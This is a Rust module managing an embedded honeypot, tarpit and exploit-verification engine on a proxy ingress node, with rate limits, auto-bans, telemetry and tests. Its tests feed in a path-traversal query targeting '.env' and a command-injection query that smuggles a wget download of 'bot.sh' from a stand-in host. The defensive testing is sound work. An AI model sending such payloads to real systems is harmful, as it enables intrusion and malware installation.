use std::future::Future;
use std::net::IpAddr;
use std::path::PathBuf;
use std::pin::Pin;
use std::sync::atomic::Ordering;
use std::sync::Arc;
use std::task::{Context, Poll};
use std::time::{Duration, Instant};

use bytes::Bytes;
use chrono::Utc;
use dashmap::DashMap;
use evilpot::{
    AdminPanelConfig, AttackSignal, AttackerSessionReport, EvilpotBody, EvilpotConfig,
    EvilpotEngine, ExploitVerificationStatus, TrapVerdict, VerificationEvidence,
};
use exposure_core::config::EvilpotNodeConfig;
use exposure_core::telemetry::{EvilpotEventInfo, EvilpotNodeReport, EvilpotSessionInfo};
use http::Response;
use http_body_util::BodyExt;
use hyper::body::{Body, Frame};
use rand::RngCore;
use tokio::sync::{OwnedSemaphorePermit, RwLock, Semaphore};
use tokio::task::JoinHandle;
use tracing::{info, warn};

use crate::ban::{evict_half, AutoBanManager, OffenseContext, OffenseKind};
use crate::egress::ProxyBody;
use crate::logger::NodeLogger;
use crate::waf::WafFinding;

/// Hard bounds on telemetry snapshots so malicious traffic can never bloat `NodeStatusSnapshot`.
const MAX_REPORT_SESSIONS: usize = 64;
const MAX_REPORT_EVENTS: usize = 64;
const MAX_SESSION_ITEMS: usize = 16;
const MAX_EVENT_EVIDENCE_ITEMS: usize = 8;
const MAX_ITEM_CHARS: usize = 256;
const MAX_PATH_CHARS: usize = 128;

/// Hard bounds on inputs forwarded into `evilpot` per request.
pub const MAX_EVILPOT_PATH_CHARS: usize = 256;
pub const MAX_EVILPOT_QUERY_CHARS: usize = 512;

/// Hard DoS / CC protection caps for embedded `evilpot` execution on Ingress.
const MAX_GLOBAL_EVILPOT_INFLIGHT: usize = 64;
const MAX_PER_IP_EVILPOT_INFLIGHT: usize = 3;
const MAX_PER_IP_HITS_PER_WINDOW: u32 = 45;
const EVILPOT_RATE_WINDOW: Duration = Duration::from_secs(60);
const MAX_TRACKED_RATE_IPS: usize = 8192;

/// Hard timeout on `evilpot` request handling (including time-blind SQLi delays).
pub const EVILPOT_HANDLE_TIMEOUT: Duration = Duration::from_secs(10);

/// Hard wall-clock ceiling on slow-drip tarpit streams (10x `tarpit_verify_min_ms`,
/// enough to verify active exfil tools while preventing multi-day connection pinning).
const MAX_EVILPOT_STREAM_DURATION: Duration = Duration::from_secs(30);

/// Alert deduplication cooldown per `(client_ip, verification_status)` to prevent alert flooding.
const ALERT_COOLDOWN: Duration = Duration::from_secs(300);
const MAX_ALERT_COOLDOWN_ENTRIES: usize = 4096;

/// Optional post-stream verification hook attached to `BoundedEvilpotBody`.
/// When a slow-drip tarpit stream completes or hits its deadline, this checks whether
/// `evilpot` upgraded the attacker to `VerifiedExploit` (`SustainedTarpitRead`) mid-stream
/// and triggers `AutoBanManager` immediately without holding an extra background task.
pub struct TarpitBanHook {
    pub engine: Arc<EvilpotEngine>,
    pub auto_ban: Arc<AutoBanManager>,
    pub logger: Arc<NodeLogger>,
    pub node_tag: String,
    pub service_tag: String,
    pub host: String,
    pub ban_file: PathBuf,
    pub client_ip: IpAddr,
    pub tls_ja3: Option<String>,
    pub user_agent: String,
    pub js_fp_hash: Option<String>,
}

/// RAII concurrency permit guarding both global and per-IP active `evilpot` request/stream slots.
pub struct EvilpotInflightPermit {
    _global: OwnedSemaphorePermit,
    per_ip_map: Arc<DashMap<IpAddr, usize>>,
    ip: IpAddr,
}

impl Drop for EvilpotInflightPermit {
    fn drop(&mut self) {
        if let dashmap::mapref::entry::Entry::Occupied(mut e) = self.per_ip_map.entry(self.ip) {
            let val = *e.get();
            if val <= 1 {
                e.remove();
            } else {
                *e.get_mut() = val - 1;
            }
        }
    }
}

/// Wraps `evilpot::EvilpotBody` with an active timer-driven wall-clock deadline and retains
/// `EvilpotInflightPermit` until the response stream finishes or closes.
/// On completion/drop, if `evilpot` upgraded the session to `VerifiedExploit` during the tarpit
/// stream (`SustainedTarpitRead`), automatically bans the confirmed attacker IP & fingerprint.
struct BoundedEvilpotBody {
    inner: EvilpotBody,
    deadline_sleep: Pin<Box<tokio::time::Sleep>>,
    _permit: Option<EvilpotInflightPermit>,
    ban_hook: Option<TarpitBanHook>,
}

impl Drop for BoundedEvilpotBody {
    fn drop(&mut self) {
        if let Some(hook) = self.ban_hook.take() {
            if let Some(session) = hook.engine.session_report(hook.client_ip) {
                if session.status == ExploitVerificationStatus::VerifiedExploit {
                    let mut outcome = hook.auto_ban.record_offense(OffenseContext {
                        client_ip: hook.client_ip,
                        tls_ja3: hook.tls_ja3.as_deref(),
                        user_agent: &hook.user_agent,
                        js_fp_hash: hook.js_fp_hash.as_deref(),
                        service_tag: Some(&hook.service_tag),
                        host: Some(&hook.host),
                        kind: OffenseKind::VerifiedExploit,
                        reason: "evilpot:verified_exploit:tarpit",
                    });
                    if outcome.any_banned() {
                        warn!(
                            client = %hook.client_ip,
                            ttl_secs = outcome.ban_ttl_secs,
                            banned_ip = outcome.newly_banned_ip,
                            banned_js_fp = outcome.newly_banned_js_fp,
                            banned_comp_fp = outcome.newly_banned_composite_fp,
                            "auto-banned confirmed attacker after sustained evilpot tarpit verification"
                        );
                    }
                    let sess_info = session_report_to_info(&hook.node_tag, &session);
                    let event_info = EvilpotEventInfo {
                        node_tag: hook.node_tag.clone(),
                        timestamp_unix: Utc::now().timestamp().max(0) as u64,
                        epoch_id: sess_info.epoch_id,
                        persona_hostname: sess_info.persona_hostname.clone(),
                        client_ip: sess_info.client_ip.clone(),
                        verification_status: sess_info.status.clone(),
                        trap_kind: "SustainedTarpitRead".to_string(),
                        detail: truncate_clean(
                            &format!("tarpit verified on {} [service={}]", hook.host, hook.service_tag),
                            MAX_ITEM_CHARS,
                        ),
                        evidence: sess_info
                            .evidence
                            .iter()
                            .take(MAX_EVENT_EVIDENCE_ITEMS)
                            .cloned()
                            .collect(),
                    };
                    for b in &mut outcome.created_bans {
                        b.node_tag = hook.node_tag.clone();
                    }
                    let newly_banned = outcome.any_banned();
                    let created_bans = outcome.created_bans;
                    let alert_msg = if newly_banned {
                        Some(format!(
                            "AutoBan triggered for {} on {} [service={}, reason=evilpot:verified_exploit:tarpit, ttl={}s, ip={}, js_fp={}, comp_fp={}]",
                            hook.client_ip,
                            hook.host,
                            hook.service_tag,
                            outcome.ban_ttl_secs,
                            outcome.newly_banned_ip,
                            outcome.newly_banned_js_fp,
                            outcome.newly_banned_composite_fp,
                        ))
                    } else {
                        None
                    };
                    if let Ok(handle) = tokio::runtime::Handle::try_current() {
                        let auto_ban = hook.auto_ban;
                        let logger = hook.logger;
                        let ban_file = hook.ban_file;
                        handle.spawn(async move {
                            logger.record_evilpot_interaction(sess_info, event_info).await;
                            if !created_bans.is_empty() {
                                logger.record_ban_records(created_bans).await;
                                let _ = tokio::task::spawn_blocking(move || auto_ban.save_to_file(&ban_file)).await;
                            }
                            if let Some(msg) = alert_msg {
                                logger.emit_alert("warning", msg).await;
                            }
                        });
                    }
                }
            }
        }
    }
}

impl Body for BoundedEvilpotBody {
    type Data = Bytes;
    type Error = hyper::Error;

    fn poll_frame(
        mut self: Pin<&mut Self>,
        cx: &mut Context<'_>,
    ) -> Poll<Option<Result<Frame<Self::Data>, Self::Error>>> {
        if self.deadline_sleep.as_mut().poll(cx).is_ready() {
            return Poll::Ready(None);
        }
        match Pin::new(&mut self.inner).poll_frame(cx) {
            Poll::Pending => Poll::Pending,
            Poll::Ready(None) => Poll::Ready(None),
            Poll::Ready(Some(Ok(frame))) => Poll::Ready(Some(Ok(frame))),
            Poll::Ready(Some(Err(never))) => match never {},
        }
    }
}

struct ActiveEvilpot {
    cfg: EvilpotNodeConfig,
    server_header: String,
    engine: Arc<EvilpotEngine>,
    rotation_task: JoinHandle<()>,
}

/// Manages an on-demand embedded `evilpot` deception, tarpit & exploit-verification engine
/// on an Ingress node with strict DoS/CC, memory, stream-duration, and alert-rate bounds.
///
/// The engine is instantiated lazily only when at least one active Guard policy uses
/// `waf.mode = evilpot`, and preserves active attacker sessions & canary tokens across
/// unrelated hot reloads.
pub struct EvilpotManager {
    node_tag: String,
    active: RwLock<Option<ActiveEvilpot>>,
    global_inflight: Arc<Semaphore>,
    per_ip_inflight: Arc<DashMap<IpAddr, usize>>,
    per_ip_rate: DashMap<IpAddr, (Instant, u32)>,
    alert_cooldowns: DashMap<(IpAddr, u8), Instant>,
}

impl EvilpotManager {
    pub fn new(node_tag: impl Into<String>) -> Self {
        Self {
            node_tag: node_tag.into(),
            active: RwLock::new(None),
            global_inflight: Arc::new(Semaphore::new(MAX_GLOBAL_EVILPOT_INFLIGHT)),
            per_ip_inflight: Arc::new(DashMap::new()),
            per_ip_rate: DashMap::new(),
            alert_cooldowns: DashMap::new(),
        }
    }

    pub async fn reconfigure(&self, cfg: &EvilpotNodeConfig, server_header: &str, enabled: bool) {
        let mut guard = self.active.write().await;
        if !enabled {
            if let Some(old) = guard.take() {
                old.rotation_task.abort();
                info!(node = %self.node_tag, "disabled embedded evilpot honeypot engine");
            }
            self.per_ip_rate.clear();
            self.alert_cooldowns.clear();
            return;
        }
        if let Some(ref existing) = *guard {
            if &existing.cfg == cfg && existing.server_header == server_header {
                return;
            }
        }
        if let Some(old) = guard.take() {
            old.rotation_task.abort();
        }
        let ep_cfg = to_evilpot_config(cfg, server_header);
        let engine = EvilpotEngine::new(ep_cfg);
        let rotation_task = engine.spawn_rotation_task();
        info!(
            node = %self.node_tag,
            rotation_secs = cfg.rotation_interval_secs,
            persona_slots = cfg.persona_slots,
            max_tarpit_conns = cfg.max_tarpit_connections,
            "initialized embedded evilpot honeypot engine"
        );
        *guard = Some(ActiveEvilpot {
            cfg: cfg.clone(),
            server_header: server_header.to_string(),
            engine,
            rotation_task,
        });
    }

    pub async fn engine(&self) -> Option<Arc<EvilpotEngine>> {
        self.active
            .read()
            .await
            .as_ref()
            .map(|a| Arc::clone(&a.engine))
    }

    pub async fn get_or_init(
        &self,
        cfg: &EvilpotNodeConfig,
        server_header: &str,
    ) -> Arc<EvilpotEngine> {
        // Fast path: clone the engine under a read lock.
        {
            let guard = self.active.read().await;
            if let Some(active) = guard.as_ref() {
                return Arc::clone(&active.engine);
            }
        }
        // Initialize while holding the write lock so a concurrent `reconfigure(enabled=false)`
        // cannot slip in between initialization and the read. Previously the two separate lock
        // acquisitions allowed `engine()` to observe `None` and panic on the request path.
        let mut guard = self.active.write().await;
        if let Some(active) = guard.as_ref() {
            return Arc::clone(&active.engine);
        }
        let ep_cfg = to_evilpot_config(cfg, server_header);
        let engine = EvilpotEngine::new(ep_cfg);
        let rotation_task = engine.spawn_rotation_task();
        info!(
            node = %self.node_tag,
            rotation_secs = cfg.rotation_interval_secs,
            persona_slots = cfg.persona_slots,
            max_tarpit_conns = cfg.max_tarpit_connections,
            "initialized embedded evilpot honeypot engine"
        );
        let engine_arc = Arc::clone(&engine);
        *guard = Some(ActiveEvilpot {
            cfg: cfg.clone(),
            server_header: server_header.to_string(),
            engine,
            rotation_task,
        });
        engine_arc
    }

    /// Fast O(1) check used to skip canary scanning on benign traffic before any trap has fired.
    pub fn has_triggered_traps(engine: &EvilpotEngine) -> bool {
        engine.metrics.traps_triggered.load(Ordering::Relaxed) > 0
    }

    /// Admission control for diverting a request into `evilpot`.
    /// Enforces per-IP rolling rate budget, per-IP concurrent limit, and global concurrent limit
    /// so CC floods or HTTP/2 stream multiplexing cannot exhaust RAM or starve Ingress slots.
    pub fn try_admit(&self, client_ip: IpAddr) -> Option<EvilpotInflightPermit> {
        // 1. Per-IP rolling 60s interaction quota
        let now = Instant::now();
        if self.per_ip_rate.len() >= MAX_TRACKED_RATE_IPS {
            self.per_ip_rate
                .retain(|_, (ts, _)| now.duration_since(*ts) < EVILPOT_RATE_WINDOW);
            if self.per_ip_rate.len() >= MAX_TRACKED_RATE_IPS {
                evict_half(&self.per_ip_rate);
            }
        }
        {
            let mut entry = self.per_ip_rate.entry(client_ip).or_insert((now, 0));
            if now.duration_since(entry.0) >= EVILPOT_RATE_WINDOW {
                *entry = (now, 1);
            } else {
                if entry.1 >= MAX_PER_IP_HITS_PER_WINDOW {
                    return None;
                }
                entry.1 = entry.1.saturating_add(1);
            }
        }

        // 2. Global concurrent Evilpot cap
        let global_permit = Arc::clone(&self.global_inflight).try_acquire_owned().ok()?;

        // 3. Per-IP concurrent Evilpot cap (atomic under DashMap entry shard lock)
        let mut entry = self.per_ip_inflight.entry(client_ip).or_insert(0);
        if *entry >= MAX_PER_IP_EVILPOT_INFLIGHT {
            return None;
        }
        *entry += 1;
        drop(entry);
        Some(EvilpotInflightPermit {
            _global: global_permit,
            per_ip_map: Arc::clone(&self.per_ip_inflight),
            ip: client_ip,
        })
    }

    /// Deduplicates alerts per `(client_ip, status)` with a 5-minute cooldown so repeated
    /// attacker requests cannot flood or evict legitimate node alerts.
    pub fn should_emit_alert(&self, client_ip: IpAddr, status: ExploitVerificationStatus) -> bool {
        let tag = match status {
            ExploitVerificationStatus::Probing => return false,
            ExploitVerificationStatus::MultiStepExploitation => 1u8,
            ExploitVerificationStatus::VerifiedExploit => 2u8,
        };
        let now = Instant::now();
        if self.alert_cooldowns.len() >= MAX_ALERT_COOLDOWN_ENTRIES {
            self.alert_cooldowns
                .retain(|_, ts| now.duration_since(*ts) < ALERT_COOLDOWN);
            if self.alert_cooldowns.len() >= MAX_ALERT_COOLDOWN_ENTRIES {
                evict_half(&self.alert_cooldowns);
            }
        }
        let key = (client_ip, tag);
        if let Some(prev) = self.alert_cooldowns.get(&key) {
            if now.duration_since(*prev) < ALERT_COOLDOWN {
                return false;
            }
        }
        self.alert_cooldowns.insert(key, now);
        true
    }

    pub async fn build_report(&self) -> Option<EvilpotNodeReport> {
        self.build_report_with_bans(None).await
    }

    pub async fn build_report_with_bans(
        &self,
        auto_ban: Option<&AutoBanManager>,
    ) -> Option<EvilpotNodeReport> {
        let ban_snap = auto_ban.map(AutoBanManager::snapshot);
        let Some(engine) = self.engine().await else {
            let snap = ban_snap?;
            if snap.active_ip_bans == 0
                && snap.active_fp_bans == 0
                && snap.total_auto_bans == 0
            {
                return None;
            }
            return Some(EvilpotNodeReport {
                node_tag: self.node_tag.clone(),
                active_ip_bans: snap.active_ip_bans,
                active_fp_bans: snap.active_fp_bans,
                total_auto_bans: snap.total_auto_bans,
                total_ban_drops: snap.total_ban_drops,
                active_bans: snap.active_bans,
                ..Default::default()
            });
        };
        let m = engine.metrics_snapshot();

        let mut raw_sessions = engine.all_session_reports();
        raw_sessions.sort_by(|a, b| {
            b.status
                .cmp(&a.status)
                .then_with(|| b.last_seen_unix.cmp(&a.last_seen_unix))
        });
        let sessions: Vec<EvilpotSessionInfo> = raw_sessions
            .into_iter()
            .take(MAX_REPORT_SESSIONS)
            .map(|s| session_report_to_info(&self.node_tag, &s))
            .collect();

        let recent_events: Vec<EvilpotEventInfo> = engine
            .recent_events()
            .into_iter()
            .rev()
            .take(MAX_REPORT_EVENTS)
            .map(|e| EvilpotEventInfo {
                node_tag: self.node_tag.clone(),
                timestamp_unix: e.timestamp_unix,
                epoch_id: e.epoch_id,
                persona_hostname: truncate_clean(&e.persona_hostname, 128),
                client_ip: truncate_clean(&e.client_ip, 64),
                verification_status: verification_status_label(e.verification_status).to_string(),
                trap_kind: truncate_clean(&e.trap_kind, 128),
                detail: truncate_clean(&e.detail, MAX_ITEM_CHARS),
                evidence: e
                    .evidence
                    .iter()
                    .take(MAX_EVENT_EVIDENCE_ITEMS)
                    .map(|ev| truncate_clean(&format_evidence(ev), MAX_ITEM_CHARS))
                    .collect(),
            })
            .collect();

        let snap = ban_snap.unwrap_or_default();
        Some(EvilpotNodeReport {
            node_tag: self.node_tag.clone(),
            current_epoch: m.current_epoch,
            rotations_completed: m.rotations_completed,
            requests_handled: m.requests_handled,
            traps_triggered: m.traps_triggered,
            canary_verifications: m.canary_verifications,
            verified_attack_sessions: m.verified_attack_sessions,
            tarpit_bytes_dripped: m.tarpit_bytes_dripped,
            active_tarpit_connections: m.active_tarpit_connections,
            active_ip_bans: snap.active_ip_bans,
            active_fp_bans: snap.active_fp_bans,
            total_auto_bans: snap.total_auto_bans,
            total_ban_drops: snap.total_ban_drops,
            sessions,
            recent_events,
            active_bans: snap.active_bans,
        })
    }
}

impl Drop for EvilpotManager {
    fn drop(&mut self) {
        if let Ok(mut guard) = self.active.try_write() {
            if let Some(old) = guard.take() {
                old.rotation_task.abort();
            }
        }
    }
}

/// Truncate and strip control characters from untrusted strings before storing in telemetry/reports.
pub fn truncate_clean(raw: &str, max_chars: usize) -> String {
    raw.chars()
        .filter(|c| !c.is_control() || *c == ' ')
        .take(max_chars)
        .collect()
}

/// Bound URI path/query strings passed into `evilpot` so huge URLs cannot inflate session state.
pub fn clamp_input_slice(raw: &str, max_chars: usize) -> &str {
    match raw.char_indices().nth(max_chars) {
        Some((idx, _)) => &raw[..idx],
        None => raw,
    }
}

fn to_evilpot_config(cfg: &EvilpotNodeConfig, server_header: &str) -> EvilpotConfig {
    let mut seed = [0u8; 8];
    rand::thread_rng().fill_bytes(&mut seed);
    let mut ep = EvilpotConfig::default();
    ep.rotation_interval_secs = cfg.rotation_interval_secs.max(60);
    ep.persona_slots = cfg.persona_slots.clamp(1, 32);
    ep.master_seed = u64::from_le_bytes(seed);
    ep.max_tarpit_connections = cfg.max_tarpit_connections.clamp(1, 256);
    ep.tarpit_drip_bytes_per_sec = cfg.tarpit_drip_bytes_per_sec.clamp(16, 16_384);
    ep.sqli_time_delay_ms = cfg.sqli_time_delay_ms.clamp(100, 5_000);
    ep.server_header = Some(server_header.trim().to_string());
    ep.emit_persona_headers = false;
    let sanitized_url: String = cfg
        .canary_webhook_url
        .trim()
        .chars()
        .filter(|c| !c.is_control())
        .take(256)
        .collect();
    if !sanitized_url.is_empty() {
        ep.canary_webhook_url = sanitized_url;
    }
    ep.max_tracked_sessions = cfg.max_tracked_sessions.clamp(16, 4096);
    // Disable standalone HTTP admin routes on Ingress — Exposure exposes all behavior analysis
    // securely via the authenticated mesh telemetry & Control Plane UI.
    ep.admin = AdminPanelConfig {
        enabled: false,
        ..Default::default()
    };
    ep
}

pub fn verification_status_label(status: ExploitVerificationStatus) -> &'static str {
    match status {
        ExploitVerificationStatus::Probing => "probing",
        ExploitVerificationStatus::MultiStepExploitation => "multi_step_exploitation",
        ExploitVerificationStatus::VerifiedExploit => "verified_exploit",
    }
}

pub fn format_evidence(ev: &VerificationEvidence) -> String {
    match ev {
        VerificationEvidence::CanaryTriggered {
            kind,
            token_or_path,
        } => format!("canary:{kind}={token_or_path}"),
        VerificationEvidence::SqliExtractionProgress {
            probe_count,
            distinct_char_positions,
        } => format!("sqli:probes={probe_count},positions={distinct_char_positions}"),
        VerificationEvidence::RceShellInteraction {
            command_count,
            last_command,
            captured_iocs,
        } => format!(
            "rce:cmds={command_count},last={last_command},iocs={}",
            captured_iocs.len()
        ),
        VerificationEvidence::MultiPathRecon {
            distinct_paths_probed,
        } => format!("recon:paths={distinct_paths_probed}"),
        VerificationEvidence::SustainedTarpitRead {
            bytes_read,
            duration_ms,
        } => format!("tarpit:bytes={bytes_read},ms={duration_ms}"),
    }
}

pub fn session_report_to_info(node_tag: &str, s: &AttackerSessionReport) -> EvilpotSessionInfo {
    EvilpotSessionInfo {
        node_tag: node_tag.to_string(),
        client_ip: truncate_clean(&s.client_ip, 64),
        epoch_id: s.epoch_id,
        persona_hostname: truncate_clean(&s.persona_hostname, 128),
        first_seen_unix: s.first_seen_unix,
        last_seen_unix: s.last_seen_unix,
        total_trapped_requests: s.total_trapped_requests,
        status: verification_status_label(s.status).to_string(),
        canary_triggers: s.canary_triggers,
        sqli_probes: s.sqli_probes,
        sqli_distinct_positions: s.sqli_distinct_positions,
        rce_commands_executed: s
            .rce_commands_executed
            .iter()
            .rev()
            .take(MAX_SESSION_ITEMS)
            .map(|c| truncate_clean(c, MAX_ITEM_CHARS))
            .collect(),
        captured_iocs: s
            .captured_iocs
            .iter()
            .take(MAX_SESSION_ITEMS)
            .map(|i| truncate_clean(i, MAX_ITEM_CHARS))
            .collect(),
        distinct_paths: s
            .distinct_paths
            .iter()
            .take(MAX_SESSION_ITEMS)
            .map(|p| truncate_clean(p, MAX_PATH_CHARS))
            .collect(),
        tarpit_bytes_consumed: s.tarpit_bytes_consumed,
        tarpit_max_duration_ms: s.tarpit_max_duration_ms,
        evidence: s
            .evidence
            .iter()
            .rev()
            .take(MAX_SESSION_ITEMS)
            .map(|ev| truncate_clean(&format_evidence(ev), MAX_ITEM_CHARS))
            .collect(),
    }
}

pub fn trap_outcome_to_event_info(
    node_tag: &str,
    session: &AttackerSessionReport,
    verdict: &TrapVerdict,
    detail: &str,
) -> EvilpotEventInfo {
    let raw_dbg = format!("{verdict:?}");
    let trap_kind = raw_dbg
        .split([' ', '{', '('])
        .next()
        .unwrap_or(&raw_dbg);
    EvilpotEventInfo {
        node_tag: node_tag.to_string(),
        timestamp_unix: session.last_seen_unix.max(Utc::now().timestamp().max(0) as u64),
        epoch_id: session.epoch_id,
        persona_hostname: truncate_clean(&session.persona_hostname, 128),
        client_ip: truncate_clean(&session.client_ip, 64),
        verification_status: verification_status_label(session.status).to_string(),
        trap_kind: truncate_clean(trap_kind, 128),
        detail: truncate_clean(detail, MAX_ITEM_CHARS),
        evidence: session
            .evidence
            .iter()
            .rev()
            .take(MAX_EVENT_EVIDENCE_ITEMS)
            .map(|ev| truncate_clean(&format_evidence(ev), MAX_ITEM_CHARS))
            .collect(),
    }
}

pub fn build_attack_signal(
    finding: &WafFinding,
    fallback_payload: Option<&str>,
) -> AttackSignal {
    let mut sig = AttackSignal::from_waf_finding(
        finding.category,
        finding.location,
        finding.confidence,
        finding.reasons.iter().map(|r| (*r).to_string()).collect(),
    );
    if let Some(ref p) = finding.matched_payload {
        sig = sig.with_payload(p.clone());
    } else if let Some(fb) = fallback_payload {
        if !fb.is_empty() {
            sig = sig.with_payload(fb.chars().take(512).collect::<String>());
        }
    }
    sig
}

/// Zero-copy conversion from `evilpot::EvilpotBody` (`Infallible` error) to Exposure's `ProxyBody`,
/// enforcing an active timer-driven stream duration deadline (`MAX_EVILPOT_STREAM_DURATION`), and
/// retaining the admission `EvilpotInflightPermit` until stream completion.
pub fn into_proxy_response(
    resp: Response<EvilpotBody>,
    permit: Option<EvilpotInflightPermit>,
) -> Response<ProxyBody> {
    into_proxy_response_with_ban_hook(resp, permit, None)
}

pub fn into_proxy_response_with_ban_hook(
    resp: Response<EvilpotBody>,
    permit: Option<EvilpotInflightPermit>,
    ban_hook: Option<TarpitBanHook>,
) -> Response<ProxyBody> {
    let deadline_sleep = Box::pin(tokio::time::sleep(MAX_EVILPOT_STREAM_DURATION));
    resp.map(|body| {
        BoundedEvilpotBody {
            inner: body,
            deadline_sleep,
            _permit: permit,
            ban_hook,
        }
        .boxed()
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::waf::{CompiledCrsEngine, WafVerdict};
    use exposure_core::config::{WafConfig, WafMode};
    use http::{HeaderMap, HeaderValue};
    use std::net::IpAddr;

    #[tokio::test]
    async fn waf_evilpot_diversion_verifies_canary_replay_and_builds_report() {
        let mgr = EvilpotManager::new("ingress-test");
        assert!(mgr.build_report().await.is_none());

        mgr.reconfigure(&EvilpotNodeConfig::default(), "nginx", true).await;
        let engine = mgr.engine().await.expect("evilpot engine active");
        assert!(!EvilpotManager::has_triggered_traps(&engine));

        let waf_cfg = WafConfig {
            mode: WafMode::Evilpot,
            ..Default::default()
        };
        let attacker_ip: IpAddr = "198.51.100.77".parse().unwrap();
        let headers = HeaderMap::new();

        // 1. WAF triggers on path traversal targeting `.env` and yields WafVerdict::Evilpot
        let crs = CompiledCrsEngine::compile(&[], &[]);
        let verdict = crs.inspect_head(
            &waf_cfg,
            "/download",
            Some("file=../../../../.env"),
            &headers,
        );
        let finding = match verdict {
            WafVerdict::Evilpot(f) => f,
            other => panic!("expected WafVerdict::Evilpot, got {other:?}"),
        };
        assert_eq!(finding.category, "path-traversal");
        assert!(finding.matched_payload.as_deref().unwrap_or("").contains(".env"));

        let permit = mgr.try_admit(attacker_ip).expect("admitted");
        let sig = build_attack_signal(&finding, Some("file=../../../../.env"));
        let outcome = engine
            .handle_attack(
                attacker_ip,
                "GET",
                "/download",
                Some("file=../../../../.env"),
                &headers,
                sig,
            )
            .await;
        assert_eq!(outcome.session.status, ExploitVerificationStatus::Probing);
        assert!(EvilpotManager::has_triggered_traps(&engine));

        let proxy_resp = into_proxy_response(outcome.response, Some(permit));
        let body_bytes = proxy_resp.into_body().collect().await.unwrap().to_bytes();
        let body_str = std::str::from_utf8(&body_bytes).unwrap();

        // 2. Attacker steals implanted canary API key and replays it on a benign-looking API request
        let persona = engine.select_persona(attacker_ip);
        assert!(body_str.contains(&persona.canary_api_key));

        let mut follow_headers = HeaderMap::new();
        follow_headers.insert(
            "authorization",
            HeaderValue::from_str(&format!("Bearer {}", persona.canary_api_key)).unwrap(),
        );
        let canary_out = engine
            .handle_canary_if_present(
                attacker_ip,
                "GET",
                "/api/v1/profile",
                None,
                &follow_headers,
            )
            .await
            .expect("canary replay must be caught");
        assert_eq!(
            canary_out.session.status,
            ExploitVerificationStatus::VerifiedExploit
        );

        // Alert cooldown emits once and suppresses immediate duplicates
        assert!(mgr.should_emit_alert(attacker_ip, ExploitVerificationStatus::VerifiedExploit));
        assert!(!mgr.should_emit_alert(attacker_ip, ExploitVerificationStatus::VerifiedExploit));

        // 3. Report accurately reflects verified session, canary metrics, and events
        let report = mgr.build_report().await.expect("report present");
        assert_eq!(report.node_tag, "ingress-test");
        assert_eq!(report.canary_verifications, 1);
        assert_eq!(report.verified_attack_sessions, 1);
        assert_eq!(report.sessions.len(), 1);
        assert_eq!(report.sessions[0].status, "verified_exploit");
        assert_eq!(report.sessions[0].canary_triggers, 1);
        assert!(!report.recent_events.is_empty());

        // 4. Disabling tears down engine cleanly
        mgr.reconfigure(&EvilpotNodeConfig::default(), "nginx", false).await;
        assert!(mgr.build_report().await.is_none());
    }

    #[tokio::test]
    async fn waf_evilpot_captures_rce_malware_ioc_in_report() {
        let mgr = EvilpotManager::new("ingress-rce");
        mgr.reconfigure(&EvilpotNodeConfig::default(), "nginx", true).await;
        let engine = mgr.engine().await.unwrap();

        let waf_cfg = WafConfig {
            mode: WafMode::Evilpot,
            ..Default::default()
        };
        let ip: IpAddr = "203.0.113.55".parse().unwrap();
        let headers = HeaderMap::new();
        let query = "host=127.0.0.1;wget+http://198.51.100.200/bot.sh+-O+/tmp/bot.sh";
        let crs = CompiledCrsEngine::compile(&[], &[]);
        let finding = match crs.inspect_head(&waf_cfg, "/ping", Some(query), &headers) {
            WafVerdict::Evilpot(f) => f,
            other => panic!("expected WafVerdict::Evilpot, got {other:?}"),
        };
        let sig = build_attack_signal(&finding, Some(query));
        let out = engine
            .handle_attack(ip, "GET", "/ping", Some(query), &headers, sig)
            .await;
        assert_eq!(out.session.status, ExploitVerificationStatus::VerifiedExploit);

        let report = mgr.build_report().await.unwrap();
        assert_eq!(report.sessions.len(), 1);
        assert!(report.sessions[0]
            .captured_iocs
            .iter()
            .any(|ioc| ioc.contains("http://198.51.100.200/bot.sh")));
    }

    #[test]
    fn admission_enforces_per_ip_concurrency_and_rate_limits() {
        let mgr = EvilpotManager::new("ingress-dos");
        let ip: IpAddr = "198.51.100.200".parse().unwrap();

        // Concurrency cap: max MAX_PER_IP_EVILPOT_INFLIGHT active permits per IP
        let mut held = Vec::new();
        for _ in 0..MAX_PER_IP_EVILPOT_INFLIGHT {
            held.push(mgr.try_admit(ip).expect("within per-IP concurrency limit"));
        }
        assert!(mgr.try_admit(ip).is_none(), "5th concurrent slot must be rejected");
        held.clear();

        // Fresh IP verifies exact rolling 60s interaction quota cap
        let ip2: IpAddr = "198.51.100.201".parse().unwrap();
        let mut admitted_total = 0u32;
        for _ in 0..(MAX_PER_IP_HITS_PER_WINDOW + 10) {
            if let Some(p) = mgr.try_admit(ip2) {
                admitted_total += 1;
                drop(p);
            }
        }
        assert_eq!(admitted_total, MAX_PER_IP_HITS_PER_WINDOW);
    }
}
